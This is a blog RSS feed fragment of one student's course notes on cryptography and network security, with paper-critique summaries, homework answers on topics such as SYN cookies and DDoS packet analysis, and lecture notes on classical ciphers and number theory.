&lt;p>Distributed Sensor Networks (DSNs) are quite different from traditional embedded system networks, such as the number of nodes. Therefore, the security of the communication between each node is crucial. However, the storage capacity and computation capability of each node is the shallow level which is not enough to handle. So, we can’t use high computing power techniques such as asymmetric cipher (RSA) to deal with it. In contrast, they decided to use a symmetric cipher system to implement it and focus the point on how to manage and keep the key safe. This paper aimed to address the number of keys that each node in DSNs has too much. For example, if the number of nodes in DSN is n, then each node has to keep n-1 shared keys for connecting. This is not a good plan to implement. Overall, they proposed a brand-new key management scheme for large-scale DSNs and attempt to find the balance between safety and efficiency. In addition, according to the simulation result, they found out the comparison is highly better than the traditional key pre-distribution scheme.&lt;/p></description></item><item><title>Cryptography and Network Security – Comparative Critique 1</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-1/</guid><description>&lt;h1 id="cryptography-and-network-security--comparative-critique-1">
 Cryptography and Network Security – Comparative Critique 1
 &lt;a class="anchor" href="#cryptography-and-network-security--comparative-critique-1">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/zB9SPcdEQkaaEMKlOtSAQg">&lt;img src="https://hackmd.io/zB9SPcdEQkaaEMKlOtSAQg/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h2 id="reading-topic-reflections-on-trusting-distributed-trust">
 Reading Topic: Reflections on trusting distributed trust
 &lt;a class="anchor" href="#reading-topic-reflections-on-trusting-distributed-trust">#&lt;/a>
&lt;/h2>
&lt;h2 id="reading-topic-reflections-on-trusting-trust">
 Reading Topic: Reflections on Trusting Trust
 &lt;a class="anchor" href="#reading-topic-reflections-on-trusting-trust">#&lt;/a>
&lt;/h2>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>Name: 何秉學	Student ID: R11921A16&lt;/p>
&lt;p>:::spoiler Background
&lt;a href="https://www.intel.com.tw/content/www/tw/zh/architecture-and-technology/software-guard-extensions.html">什麼是 Intel® SGX？&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>提供以硬體為基礎的記憶體加密功能，可在記憶體內隔離特定的應用程式碼與資料。Intel® SGX 允許將使用者層級的程式碼配置於記憶體中的隱私區域，這稱為「指定位址空間」(enclave)，其設計是為了在較高權限層級的執行程序中受到保護&lt;/p>&lt;/blockquote>
&lt;hr>
&lt;p>&lt;a href="https://support.mozilla.org/zh-TW/kb/send-performance-data-improve-firefox">What is firefox Telemetry&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>這個功能對 Mozilla 工程師來說很有幫助，它可以幫助工程師了解 Firefox 實際的運作狀況。Telemetry 會傳送使用量及體驗的資訊給 Mozilla。當您使用 Firefox 時，Telemetry 就會測量與收集與個人隱私無關的資訊，例如記憶體消耗、反應時間和各種功能的使用頻率。這些資訊會每天例行傳送給 Mozilla 利用，讓 Firefox 越來越完善。&lt;/p>&lt;/blockquote>
&lt;hr>
&lt;p>&lt;a href="https://letsencrypt.org/zh-tw/getting-started/">Let&amp;rsquo;s Encrypt &amp;amp; ISRG&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>Let&amp;rsquo;s Encrypt 是免費、自動化和開放的憑證頒發機構，由非營利組織網路安全研究小組 (Internet Security Research Group, ISRG) 營運。&lt;/p></description></item><item><title>Cryptography and Network Security – Comparative Critique 2</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-2/</guid><description>&lt;h1 id="cryptography-and-network-security--comparative-critique-2">
 Cryptography and Network Security – Comparative Critique 2
 &lt;a class="anchor" href="#cryptography-and-network-security--comparative-critique-2">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/bP2EPLmtSHWEM-XnakrMkA">&lt;img src="https://hackmd.io/bP2EPLmtSHWEM-XnakrMkA/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h2 id="reading-topic-the-password-reset-mitm-attack">
 Reading Topic: The Password Reset MitM Attack
 &lt;a class="anchor" href="#reading-topic-the-password-reset-mitm-attack">#&lt;/a>
&lt;/h2>
&lt;h2 id="reading-topic-is-real-time-phishing-eliminated-with-fido-social-engineering-downgrade-attacks-against-fido-protocols">
 Reading Topic: Is Real-time Phishing Eliminated with FIDO? Social Engineering Downgrade Attacks against FIDO Protocols
 &lt;a class="anchor" href="#reading-topic-is-real-time-phishing-eliminated-with-fido-social-engineering-downgrade-attacks-against-fido-protocols">#&lt;/a>
&lt;/h2>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>Name: 何秉學	Student ID: R11921A16&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.jendow.com.tw/wiki/%E9%99%8D%E7%B4%9A%E6%94%BB%E6%93%8A">Downgrade Attack&lt;/a>
&lt;a href="https://hennge.com/tw/blog/what-is-fido.html">FIDO 是什麼？&lt;/a>
&lt;a href="https://blog.csdn.net/Kangyucheng/article/details/78911934">Topic 1 Translation&lt;/a>&lt;/p>
&lt;h2 id="summary-of-paper-1">
 Summary of paper 1
 &lt;a class="anchor" href="#summary-of-paper-1">#&lt;/a>
&lt;/h2>
&lt;p>The Password Reset MitM Attack&amp;quot; paper aims to address a security vulnerability in the password reset process that allows attackers to intercept a victim&amp;rsquo;s password reset link and gain access to their account. This problem matters because attackers can compromise personal information and sensitive data. The paper presents the Password Reset Man-in-the-Middle (PRMitM) attack and proposes several defenses to mitigate the risk, including challenge-response protocols and additional authentication factors. The authors conclude that PRMitM attacks are a significant threat to online account security, and suggest implementing additional security measures and informing users of the risks to strengthen the security of their accounts.&lt;/p></description></item><item><title>Cryptography and Network Security – Comparative Critique 3</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-3/</guid><description>&lt;h1 id="cryptography-and-network-security--comparative-critique-3">
 Cryptography and Network Security – Comparative Critique 3
 &lt;a class="anchor" href="#cryptography-and-network-security--comparative-critique-3">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/MLHx12AhT-S-DUoRfGUn4A">&lt;img src="https://hackmd.io/MLHx12AhT-S-DUoRfGUn4A/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h2 id="reading-topic-dnssec-vs-dohdns-over-https">
 Reading Topic: DNSSEC VS DoH(DNS-over-HTTPS)
 &lt;a class="anchor" href="#reading-topic-dnssec-vs-dohdns-over-https">#&lt;/a>
&lt;/h2>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>Name: 何秉學	Student ID: R11921A16&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://tw.godaddy.com/help/what-is-dnssec-6135">什麼是 DNSSEC？&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>什麼是 DNSSEC？&lt;/p>
&lt;p>網域名稱系統安全性擴充 (DNSSEC) 可為網域名稱的 DNS (網域名稱系統) 加上電子簽名，藉此判斷來源網路名稱的真實性。此功能可以保護網路使用者不受假造 DNS 資料的威脅，讓使用者要求正確網址時不會取得其他有意誤導或惡意製作的網址。&lt;/p>
&lt;p>啟用 DNSSEC 後，DNS 查閱會使用電子簽名驗證網站 DNS 來源是否有效，這樣做可以協助防止受到特定類型的攻擊，而當電子簽名不一致的時候，瀏覽器便不會顯示網站。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://blog.miniasp.com/post/2008/10/22/Be-careful-DNS-cache-poisoning-attack">What is DNS Cache Poisoning? - 小心網域名稱伺服器快取毒害(DNS cache poisoning)攻擊&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>簡單的說，DNS 通常都會實做快取(Cache)功能，若 DNS 收到來自惡意假造的 DNS 封包，導致將錯誤的 Domain Name v.s. IP 對應資料快取在 DNS Server 中，就會讓使用這台 DNS Server 的使用者連結到錯誤的 IP，這將會是個十分嚴重的安全性漏洞！而這樣的安全性漏洞就稱之為 DNS cache poisoning&lt;/p></description></item><item><title>Cryptography and Network Security – Homework 1</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-1/</guid><description>&lt;h1 id="cryptography-and-network-security--homework-1">
 Cryptography and Network Security – Homework 1
 &lt;a class="anchor" href="#cryptography-and-network-security--homework-1">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/Tq2dPdTKQv6p3AvNbmyNig">&lt;img src="https://hackmd.io/Tq2dPdTKQv6p3AvNbmyNig/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler TOC
[TOC]
:::
:::info
&lt;a href="https://hackmd.io/@uqzWTXyyTk6IYTBwcPwnoA/BJZNQfcTo">Official Solution&lt;/a>
:::
Student ID: &lt;code>R11921A16&lt;/code>
Name: 何秉學&lt;/p>
&lt;h2 id="handwriting">
 Handwriting
 &lt;a class="anchor" href="#handwriting">#&lt;/a>
&lt;/h2>
&lt;h3 id="1-cia">
 1. CIA
 &lt;a class="anchor" href="#1-cia">#&lt;/a>
&lt;/h3>
&lt;p>&lt;strong>Ans:&lt;/strong>
&lt;strong>Confidentiality&lt;/strong> means all of the sensitive messages or information that can be protected so that just the people who have the authentication can edit or browse the information.&lt;/p>
&lt;p>&lt;strong>Integrity&lt;/strong> refers to the completeness of the message you transferred and ensured that the message is not altered by an unauthenticated person.&lt;/p></description></item><item><title>Cryptography and Network Security – Homework 2</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-2/</guid><description>&lt;h1 id="cryptography-and-network-security--homework-2">
 Cryptography and Network Security – Homework 2
 &lt;a class="anchor" href="#cryptography-and-network-security--homework-2">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/JauWo5dWQFS1wnZZjTPqow">&lt;img src="https://hackmd.io/JauWo5dWQFS1wnZZjTPqow/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler TOC
[TOC]
:::
Student ID: &lt;code>R11921A16&lt;/code>
Name: 何秉學&lt;/p>
&lt;h2 id="handwriting">
 Handwriting
 &lt;a class="anchor" href="#handwriting">#&lt;/a>
&lt;/h2>
&lt;h3 id="1-syn-cookies">
 1. SYN Cookies
 &lt;a class="anchor" href="#1-syn-cookies">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>Ans:
This strategy involves the creation of a cookie by the server. In order to avoid the risk of dropping connections when the backlog has been filled, the server responds to each connection request with a SYN-ACK packet but then drops the SYN request from the backlog, removing the request from memory and leaving the port open and ready to make a new connection. If the connection is a legitimate request, and a final ACK packet is sent from the client machine back to the server, the server will then reconstruct (with some limitations) the SYN backlog queue entry. While this mitigation effort does lose some information about the TCP connection, it is better than allowing denial-of-service to occur to legitimate users as a result of an attack.&lt;/p></description></item><item><title>Cryptography and Network Security – Homework 3</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--homework-3/</guid><description>&lt;h1 id="cryptography-and-network-security--homework-3">
 Cryptography and Network Security – Homework 3
 &lt;a class="anchor" href="#cryptography-and-network-security--homework-3">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/JO7xByQgQWK67eU0goHMeA">&lt;img src="https://hackmd.io/JO7xByQgQWK67eU0goHMeA/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="1-ddos">
 1. DDoS
 &lt;a class="anchor" href="#1-ddos">#&lt;/a>
&lt;/h2>
&lt;h3 id="1">
 1)
 &lt;a class="anchor" href="#1">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Hint: You can use I/O Graphs to find the time that the flow starts to burst. Then you can find the first packet near there.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Ans: Using I/O graph in &lt;code>Statistic/I/O Graphs&lt;/code> in wireshark, then you can figure out the whole trend of this network flow.
:::spoiler Result Screenshot
&lt;img src="https://hackmd.io/_uploads/rJk-LueL3.jpg" alt="" />
:::
Also, you can set the different scale of the graph and figure out the attack time precisely. I set the &lt;code>Interval=100ms&lt;/code> and find the increasing time at &lt;code>24.8s&lt;/code> which is &lt;code>No.55862&lt;/code> packet shown as below.
:::spoiler Result Screenshot
&lt;img src="https://hackmd.io/_uploads/ryG7POxL2.png" alt="" />
:::
Thus, the attack time should be at &lt;font color="FF0000">&lt;code>24.945277&lt;/code>&lt;/font> and the victim is &lt;font color="FF0000">&lt;code>192.168.232.95&lt;/code>&lt;/font>
:::spoiler Result Screenshot
&lt;img src="https://hackmd.io/_uploads/Syurtue8h.png" alt="" />
:::&lt;/p></description></item><item><title>Cryptography and Network Security – HW0</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--hw0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/homework/cryptography-and-network-security--hw0/</guid><description>&lt;h1 id="cryptography-and-network-security--hw0">
 Cryptography and Network Security – HW0
 &lt;a class="anchor" href="#cryptography-and-network-security--hw0">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/_JU7eHmcRF-v8G6yQ3YHWQ">&lt;img src="https://hackmd.io/_JU7eHmcRF-v8G6yQ3YHWQ/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h2 id="reading-topic-the-tangled-web-of-password-reuse">
 Reading Topic: The Tangled Web of Password Reuse
 &lt;a class="anchor" href="#reading-topic-the-tangled-web-of-password-reuse">#&lt;/a>
&lt;/h2>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>Name: 何秉學	Student ID: R11921A16&lt;/p>
&lt;h2 id="summary">
 Summary
 &lt;a class="anchor" href="#summary">#&lt;/a>
&lt;/h2>
&lt;p>Password security is a critical issue that we may pay attention. However, most people choose easy-remembered strings as their online-service password, which may cause the users to re-used the password as a different online service. Unfortunately, the number of network attacks is increasing, and attackers contain tons of users&amp;rsquo; information including re-used passwords. They tried to propose a guessing password algorithm including character sequence, deletions, insertion, capitalization, reversal, leet-speak, and substring movement to guess a series of candidate passwords that users may use at different websites according to a set of leaked passwords. Their prototype guessing algorithm is able to crack approximately 10% of the nonidentical password pairs in less than 10 attempts and approximately 30% such pairs in less than 100 attempts.&lt;/p></description></item><item><title>Cryptography and Network Security – Regular Critique 3</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-3/</guid><description>&lt;h1 id="cryptography-and-network-security--regular-critique-3">
 Cryptography and Network Security – Regular Critique 3
 &lt;a class="anchor" href="#cryptography-and-network-security--regular-critique-3">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/q_V04ik8RkCQS4-DbqJoGg">&lt;img src="https://hackmd.io/q_V04ik8RkCQS4-DbqJoGg/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h2 id="reading-topic-automated-detection-of-ipv6-privacy-leakage-in-home-networks">
 Reading Topic: Automated Detection of IPv6 Privacy Leakage in Home Networks
 &lt;a class="anchor" href="#reading-topic-automated-detection-of-ipv6-privacy-leakage-in-home-networks">#&lt;/a>
&lt;/h2>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>Name: 何秉學	Student ID: R11921A16&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.moneydj.com/kmdj/wiki/wikiviewer.aspx?keyid=047cf9b1-e1ba-4578-8fcc-160bd2d3fc8d">What is Customer Premise Equipment? - 用戶終端設備(CPE)&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>英文名稱為Customer Premise Equipment，是指網路連接至用戶端的相關設備，包括數據機、寬頻路由器、寬頻閘道器等，但隨著電信網路應用服務逐漸多元化，只要是用戶端所使用的網路服務設備，都可稱為CPE裝置，包括VoIP閘道器、IP phone、雙模手機、IP STB等。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.jannet.hk/ip-address-version-6-ipv6-zh-hant/">What is EUI-64?&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>IPv6 Address太長，要網管人員逐個Interface設定IPv6 Address肯定是件痛苦的事。EUI-64讓我們只需幫Interface试定Prefix部份,然後Interface就會用MAC Address自動產生Interface ID，基於MAC Address 獨一無二，利用 EUI-64 必能生成獨一無二的 IPv6 Address。EUI-64 產生 Interface ID 的辦法是先把MAC Address （共48 Bits）斬開兩等份.中間插入FFFE供16 Bits），使其成為64 Bits，然後把第7 Bit由0改成1。最後在前面加上Prefix歟成為一組IPv6 Address 了。&lt;/p></description></item><item><title>Cryptography and Network Security – Regular Critique 4</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--regular-critique-4/</guid><description>&lt;h1 id="cryptography-and-network-security--regular-critique-4">
 Cryptography and Network Security – Regular Critique 4
 &lt;a class="anchor" href="#cryptography-and-network-security--regular-critique-4">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/pkjE25TQSNmDRBm-9OJL8A">&lt;img src="https://hackmd.io/pkjE25TQSNmDRBm-9OJL8A/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h2 id="reading-topic-dos-and-donts-of-machine-learning-in-computer-security">
 Reading Topic: Dos and Don&amp;rsquo;ts of Machine Learning in Computer Security
 &lt;a class="anchor" href="#reading-topic-dos-and-donts-of-machine-learning-in-computer-security">#&lt;/a>
&lt;/h2>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>Name: 何秉學	Student ID: R11921A16&lt;/p>
&lt;h2 id="summary">
 Summary
 &lt;a class="anchor" href="#summary">#&lt;/a>
&lt;/h2>
&lt;p>In this paper, they tried to point out some pitfalls of computer security paper that are associated with machine learning. Especially the paper in the last 10 years published at top-tier conferences. In addition, they identify 10 common pitfalls such as sampling bias problems, label inaccuracy, data snooping problems, spurious correlations, etc that are associated with the whole machine learning workflow, i.e. data collection and labeling, system design and learning, performance evaluation and deployment, and operation. They also provide some recommendations and some remedies and try to mitigate the threat. The top 3 pitfalls in their research are sampling bias, data snooping, and lab-only evaluation.&lt;/p></description></item><item><title>Cryptography Lec 1(Overview) - Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-1overview---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-1overview---notes/</guid><description>&lt;h1 id="cryptography-lec-1overview---notes">
 Cryptography Lec 1(Overview) - Notes
 &lt;a class="anchor" href="#cryptography-lec-1overview---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-cryptography-ntu">
 tags: &lt;code>Cryptography&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-cryptography-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Chosen Plaintext Attack(CPA security)
Attacker只可以拿到plaintext相對應的ciphertext，通常是在同一把key重複使用的情況下&lt;/p>
&lt;p>Chosen Cipnertext Attack(CCA security)
Attacker不只可以拿到plaintext相對應的ciphertext，他也可以知道ciphertext相對應的plaintext，進而得知很多額外的資訊&lt;/p>
&lt;p>Mode of Operation
e.g. ECB, CBC, CTR, GCM&amp;hellip;(Nonsecure $\to$ Secure)
選擇甚麼樣的mode和選擇麼加密演算法是完全獨立的事情，也可以每一個block都使用完全不同的加密演算法&lt;/p></description></item><item><title>Cryptography Lec 2(Historical Ciphers) - Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-2historical-ciphers---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-2historical-ciphers---notes/</guid><description>&lt;h1 id="cryptography-lec-2historical-ciphers---notes">
 Cryptography Lec 2(Historical Ciphers) - Notes
 &lt;a class="anchor" href="#cryptography-lec-2historical-ciphers---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-cryptography-ntu">
 tags: &lt;code>Cryptography&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-cryptography-ntu">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler &lt;a href="https://ithelp.ithome.com.tw/articles/10160406">資訊安全筆記2 The Vigenere Cipher&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>The Vigenere Cipher是一種&amp;quot;polyalphabetic cipher&amp;quot;用一串的 Key 不斷地重複！例如 abcabcabcabc
計算方法：
例如key = d 代表a會變成d所以 w 會變成 Z&lt;/p>
&lt;p>課本上的例子：
&lt;img src="http://ithelp.ithome.com.tw/upload/images/20141017/201410172334255441370129a1a_resize_600.png" alt="" />
:::&lt;/p>&lt;/blockquote>
&lt;p>:::spoiler &lt;a href="https://www.geeksforgeeks.org/playfair-cipher-with-examples/">Playfair Cipher&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>The Playfair Cipher Encryption Algorithm:
The Algorithm consists of 2 steps:&lt;/p>
&lt;ol>
&lt;li>Generate the key Square(5×5):&lt;/li>
&lt;li>Algorithm to encrypt the plain text: The plaintext is split into pairs of two letters (digraphs). If there is an odd number of letters, a Z is added to the last letter.
&amp;gt; For example:
&lt;code>PlainText: &amp;quot;instruments&amp;quot; After Split: 'in' 'st' 'ru' 'me' 'nt' 'sz'&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>:::info
Note that: Pair cannot be made with same letter. Break the letter in single and add a bogus letter to the previous letter.
:::&lt;/p></description></item><item><title>Cryptography Lec 3(Mathematical Background) - Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-3mathematical-background---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-3mathematical-background---notes/</guid><description>&lt;h1 id="cryptography-lec-3mathematical-background---notes">
 Cryptography Lec 3(Mathematical Background) - Notes
 &lt;a class="anchor" href="#cryptography-lec-3mathematical-background---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-cryptography-ntu">
 tags: &lt;code>Cryptography&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-cryptography-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler &lt;a href="https://youtu.be/qym5D5bhoQs">Euclidean Algorithm(輾轉相除法)&lt;/a>
Given $a$ and $b$ with $a \ge b$
Compute $gcd(a,\ b)=gcd(b,\ a\ mod\ b)$, $gcd(a,\ 0)=a$
For example
$$
Compute\ gcd(140,\ 297)\
297=2&lt;em>140+17 \
140=8&lt;/em>17+4 \
17=4&lt;em>4+1 \
4=4&lt;/em>4+0
$$
Then we found the $gcd(140,\ 297)=1$&lt;/p>
&lt;hr>
&lt;p>Another Example:
$$
Compute\ gcd(270,\ 192)\
270=1&lt;em>192+78\
192=2&lt;/em>78+36\
78=2&lt;em>36+6\
36=6&lt;/em>6+0
$$
Then we found $gcd(270,\ 192)=6$
:::&lt;/p></description></item><item><title>Cryptography Lec 4(Information Theory) - Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-4information-theory---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-4information-theory---notes/</guid><description>&lt;h1 id="cryptography-lec-4information-theory---notes">
 Cryptography Lec 4(Information Theory) - Notes
 &lt;a class="anchor" href="#cryptography-lec-4information-theory---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-cryptography-ntu">
 tags: &lt;code>Cryptography&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-cryptography-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Shannon&amp;rsquo;s Theorem
假設：$(P,\ C,\ K,\ e_k(\cdot),\ d_k(\cdot))$是一個cryptosystem，且$P,\ C,\ K$各自集合的數量都是一樣的
則：
$$此cryptosystem具有perfect\ secrecy\
iff\
每一把key被使用的機率都相同，i.e.{1 \over #K}，且對於每個m\in P和c\in C都有一個獨立的key\ k使得e_k(m)=c
$$&lt;/p></description></item><item><title>Cryptography Lec 5(Symmetric Key Cryptography) - Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-5symmetric-key-cryptography---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-crypto/cryptography-lec-5symmetric-key-cryptography---notes/</guid><description>&lt;h1 id="cryptography-lec-5symmetric-key-cryptography---notes">
 Cryptography Lec 5(Symmetric Key Cryptography) - Notes
 &lt;a class="anchor" href="#cryptography-lec-5symmetric-key-cryptography---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-cryptography-ntu">
 tags: &lt;code>Cryptography&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-cryptography-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.csdn.net/qq_42950838/article/details/117536583#Modification_Detection_Code_MDC_9">What is MDC and MAC? - 【CN007】数据安全笔记8 —— MDC 和 MAC&lt;/a>&lt;/p>
&lt;blockquote>
&lt;h2 id="">
 MDC 是一種用於驗證數據完整性的摘要信息，保證數據沒有被更改。
&lt;img src="https://img-blog.csdnimg.cn/20210603231335485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTUwODM4,size_16,color_FFFFFF,t_70" alt="" />
 &lt;a class="anchor" href="#">#&lt;/a>
&lt;/h2>
&lt;p>MAC 在 MDC 的基礎上增加了 Key 的使用。同時驗證數據完整性和發送者，保證發送者是特定人並且傳輸過程中數據沒有被更改。MAC 函數又稱為 Key 哈希函數（Keyed Hash Function）
&lt;img src="https://img-blog.csdnimg.cn/20210603225822420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTUwODM4,size_16,color_FFFFFF,t_70" alt="" />&lt;/p>&lt;/blockquote>
&lt;p>:::spoiler &lt;a href="https://ithelp.ithome.com.tw/articles/10263124">About RC4&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>第一部分 前置作業&lt;/p>
&lt;ol>
